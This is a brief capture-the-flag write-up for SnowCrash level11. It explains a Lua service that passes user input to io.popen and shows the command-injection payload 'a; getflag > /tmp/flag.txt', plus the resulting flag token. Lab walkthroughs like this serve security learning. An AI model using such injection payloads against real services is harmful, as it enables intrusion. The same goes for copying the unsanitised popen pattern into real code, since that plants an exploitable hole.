When we started the level11 there is:
- A binary called **level11.lua**

It's a lua code, listening on port 5151.
We can access it with:
```bash
nc 127.0.0.1 5151
```

It ask for a password and hash it to compare it with a hash.
[md5decrypt](https://md5decrypt.net/en/Sha1/) tell us that the hash is NotSoEasy, but this password don't give the flag.

After a bit of research, turns out the code line :
```lua
  prog = io.popen("echo "..pass.." | sha1sum", "r")
```

is a security hole !

**io.popen** open a shell to execute a command.
the given command is
```bash
"echo password | sha1sum"
```

So we can give this password and get the flag :

```bash
level11@SnowCrash:~$ nc localhost 5151
Password: a; getflag > /tmp/flag.txt
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag.txt
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

**a;** will close the echo, so we can execute another command:

```bash
echo a; getflag > /tmp/flag.txt | sha1sum
```